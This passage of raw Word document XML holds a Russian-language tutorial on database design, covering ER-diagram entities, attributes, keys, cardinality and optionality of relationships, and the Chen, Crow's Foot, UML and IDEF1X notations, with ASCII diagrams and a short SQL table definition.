        <w:t xml:space="preserve">    surname VARCHAR(50) NOT NULL,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    name VARCHAR(50) NOT NULL,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    group_name VARCHAR(10),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    INDEX idx_group (group_name)</w:t>
        <w:br/>
        <w:t>) ENGINE=InnoDB;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем три уровня?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Чтобы отделить бизнес-логику (инфологическая) от реализации (физическая). Можно сначала нарисовать ER-диаграмму с заказчиком, а потом спокойно портировать БД с MySQL на PostgreSQL, не меняя концептуальную модель.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2. ER-диаграммы (Entity-Relationship)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ER-модель</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это графический способ описания сущностей (entities) и связей (relationships) между ними. Придумана Питером Ченом в 1976 году, и с тех пор стала стандартом де-факто.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.1. Основные элементы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Сущность (Entity)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сущность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это объект реального мира, информацию о котором мы хотим хранить.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Студент</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Курс</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Преподаватель</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Книга</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Заказ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Товар</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">На диаграмме: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>прямоугольник</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> с названием сущности.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>┌─────────────┐</w:t>
        <w:br/>
        <w:t>│   Студент   │</w:t>
        <w:br/>
        <w:t>└─────────────┘</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Атрибут (Attribute)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Атрибут</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это свойство сущности.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Примеры атрибутов сущности «Студент»:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Фамилия</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Имя</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Дата рождения</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Номер зачётки</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Email</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Группа</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">На диаграмме: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>овалы</w:t>
      </w:r>
      <w:r>
        <w:t>, соединённые с сущностью, или просто список внутри прямоугольника (зависит от нотации).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>┌─────────────────────┐</w:t>
        <w:br/>
        <w:t>│      Студент        │</w:t>
        <w:br/>
        <w:t>├─────────────────────┤</w:t>
        <w:br/>
        <w:t>│ • id                │</w:t>
        <w:br/>
        <w:t>│ • фамилия           │</w:t>
        <w:br/>
        <w:t>│ • имя               │</w:t>
        <w:br/>
        <w:t>│ • дата_рождения     │</w:t>
        <w:br/>
        <w:t>│ • номер_зачётки     │</w:t>
        <w:br/>
        <w:t>│ • email             │</w:t>
        <w:br/>
        <w:t>│ • группа            │</w:t>
        <w:br/>
        <w:t>└─────────────────────┘</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Ключ (Key)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Первичный ключ (Primary Key, PK)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — атрибут, однозначно идентифицирующий экземпляр сущности.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Пример: `id`, `номер_зачётки` (если уникален)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>На диаграмме: подчёркивание или пометка `PK`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>┌─────────────────────┐</w:t>
        <w:br/>
        <w:t>│      Студент        │</w:t>
        <w:br/>
        <w:t>├─────────────────────┤</w:t>
        <w:br/>
        <w:t>│ PK: id              │  ← первичный ключ</w:t>
        <w:br/>
        <w:t>│ • фамилия           │</w:t>
        <w:br/>
        <w:t>│ • имя               │</w:t>
        <w:br/>
        <w:t>│ • email             │</w:t>
        <w:br/>
        <w:t>└─────────────────────┘</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Внешний ключ (Foreign Key, FK)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — атрибут, ссылающийся на первичный ключ другой сущности. Используется для связывания таблиц.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Уникальный ключ (Unique Key)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — атрибут, который должен быть уникальным, но не является первичным ключом (например, `email`).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Составной ключ (Composite Key)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — первичный ключ, состоящий из нескольких атрибутов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Пример: в таблице `Оценка` ключ = `(студент_id, курс_id)`, если студент может получить только одну оценку за курс.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Связь (Relationship)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Связь</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это ассоциация между двумя (или более) сущностями.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Студент **учится на** Курсе</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Преподаватель **ведёт** Курс</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Читатель **берёт** Книгу</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">На диаграмме: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ромб</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (классическая нотация Chen) или </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>линия</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> с пометками кардинальности (Crow's Foot).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>┌─────────┐         ┌─────────┐</w:t>
        <w:br/>
        <w:t>│ Студент │────────│  Курс   │</w:t>
        <w:br/>
        <w:t>└─────────┘         └─────────┘</w:t>
        <w:br/>
        <w:t xml:space="preserve">     учится на</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.2. Типы связей (кардинальность)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Один-к-одному (1:1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Каждая запись сущности A связана </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>максимум с одной</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> записью сущности B, и наоборот.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Пример: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Человек ↔ Паспорт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>У человека один паспорт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>У паспорта один владелец</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>┌─────────┐  1:1  ┌─────────┐</w:t>
        <w:br/>
        <w:t>│ Человек │───────│ Паспорт │</w:t>
        <w:br/>
        <w:t>└─────────┘       └─────────┘</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В реальности такие связи встречаются редко. Часто их можно объединить в одну таблицу.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Один-ко-многим (1:M или 1:N)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Одна запись сущности A связана с </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>несколькими</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> записями сущности B, но каждая запись B связана только с одной записью A.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Пример: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Преподаватель → Курсы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Один преподаватель ведёт несколько курсов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Каждый курс ведёт один преподаватель (упрощение)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>┌──────────────┐  1    N  ┌──────┐</w:t>
        <w:br/>
        <w:t>│ Преподаватель│──────────│ Курс │</w:t>
        <w:br/>
        <w:t>└──────────────┘          └──────┘</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>самый распространённый</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> тип связи. В реляционной БД реализуется через внешний ключ в таблице «многих» (Курс.преподаватель_id).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Многие-ко-многим (M:N)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Одна запись сущности A связана с </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>несколькими</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> записями сущности B, и наоборот.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Пример: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Студент ↔ Курс</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Один студент учится на нескольких курсах</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Один курс посещают несколько студентов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>┌─────────┐  M    N  ┌──────┐</w:t>
        <w:br/>
        <w:t>│ Студент │──────────│ Курс │</w:t>
        <w:br/>
        <w:t>└─────────┘          └──────┘</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: в реляционной БД связь M:N напрямую не реализуется. Нужна </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>промежуточная таблица</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (associative entity, junction table).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>┌─────────┐  1    N  ┌──────────┐  N    1  ┌──────┐</w:t>
        <w:br/>
        <w:t>│ Студент │──────────│ Запись_на│──────────│ Курс │</w:t>
        <w:br/>
        <w:t>└─────────┘          │   курс   │          └──────┘</w:t>
        <w:br/>
        <w:t xml:space="preserve">                     └──────────┘</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Таблица `Запись_на_курс` содержит:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`студент_id` (FK)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`курс_id` (FK)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>дополнительные атрибуты (например, `дата_записи`, `статус`)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Первичный ключ: `(студент_id, курс_id)` (составной ключ).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.3. Обязательность связи</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Обязательная связь</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (mandatory): сущность </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>должна</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> участвовать в связи.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Пример: Заказ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>должен</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> принадлежать Клиенту (не бывает заказов без клиента).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Необязательная связь</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (optional): сущность </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>может</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> участвовать в связи.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Пример: Сотрудник </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>может</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> иметь Служебный автомобиль (не у всех есть).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Обозначение (нотация Crow's Foot):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Обязательная**: вертикальная черта `|`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Необязательная**: кружок `○`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>┌─────────┐       ┌─────────┐</w:t>
        <w:br/>
        <w:t>│ Клиент  │|─────○│  Заказ  │</w:t>
        <w:br/>
        <w:t>└─────────┘       └─────────┘</w:t>
        <w:br/>
        <w:t xml:space="preserve">    1               0..N</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Чтение: «Один клиент может иметь ноль или несколько заказов. Каждый заказ принадлежит ровно одному клиенту (обязательно).»</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3. Нотации ER-диаграмм</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Существует несколько нотаций для рисования ER-диаграмм. Выбор — дело вкуса, но </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Crow's Foot</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> самая популярная.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.1. Chen Notation (классическая)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сущности</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: прямоугольники  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Атрибуты</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: овалы  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Связи</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: ромбы  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Кардинальность</w:t>
      </w:r>
      <w:r>
        <w:t>: `1`, `M`, `N` около линии</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Плюсы: классика, строгость  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Минусы: громоздко для больших диаграмм</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.2. Crow's Foot (вороньи лапки)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сущности</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: прямоугольники с атрибутами внутри  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Связи</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: линии  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Кардинальность</w:t>
      </w:r>
      <w:r>
        <w:t>: символы на концах линий</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Символы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`|` — ровно один (обязательно)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`○` — ноль или один (необязательно)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`&lt;` (три линии, похоже на вороньи лапки) — много</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>┌─────────┐       ┌──────┐</w:t>
        <w:br/>
        <w:t>│ Клиент  │|─────&lt;│ Заказ│</w:t>
        <w:br/>
        <w:t>└─────────┘       └──────┘</w:t>
        <w:br/>
        <w:t xml:space="preserve">    1              0..N</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Чтение: «Клиент может иметь ноль или много заказов. Заказ принадлежит ровно одному клиенту.»</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Плюсы: компактность, интуитивность, популярность  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Минусы: иногда путают символы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.3. UML Class Diagram</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сущности</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: классы (прямоугольники с тремя секциями: имя, атрибуты, методы)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Связи</w:t>
      </w:r>
      <w:r>
        <w:t>: линии с множественностью `1`, `0..1`, `*`, `1..*`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Используется в объектно-ориентированном анализе. В базах данных редко.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.4. IDEF1X</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Стандарт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: федеральный стандарт США для CASE-инструментов  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Особенности</w:t>
      </w:r>
      <w:r>
        <w:t>: строгая нотация, зависимые/независимые сущности, идентифицирующие/неидентифицирующие связи</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Плюсы: формальность, поддержка сложных моделей  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Минусы: сложность для новичков</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: для учёбы используй </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Crow's Foot</w:t>
      </w:r>
      <w:r>
        <w:t>. Для работы — то, что принято в компании.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4. Этапы инфологического моделирования</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
